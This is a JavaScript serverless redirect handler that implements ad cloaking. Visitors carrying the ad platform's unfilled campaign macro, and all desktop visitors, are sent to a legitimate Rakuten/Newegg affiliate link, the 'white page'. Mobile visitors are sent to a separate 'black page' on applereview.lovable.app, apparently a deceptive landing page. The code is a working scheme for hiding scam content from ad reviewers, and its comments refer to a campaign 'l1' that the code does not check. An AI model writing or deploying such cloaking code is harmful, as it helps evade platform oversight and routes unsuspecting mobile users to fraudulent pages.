export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.rakuten.com/newegg_9344-xfas?store_url=https%3A%2F%2Fwww.newegg.com%2Fp%2F021-000Q-003W4%3Fitem%3D9SIBRF4K3A0651&sourceName=Web-Desktop&itemId=9344-9SIBRF4K3A0651&itemGenre=6058&itemPrice=1130&ebstask=shoppingTripAttrProps";
    const blackPageURL = "https://applereview.lovable.app";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();

  }





















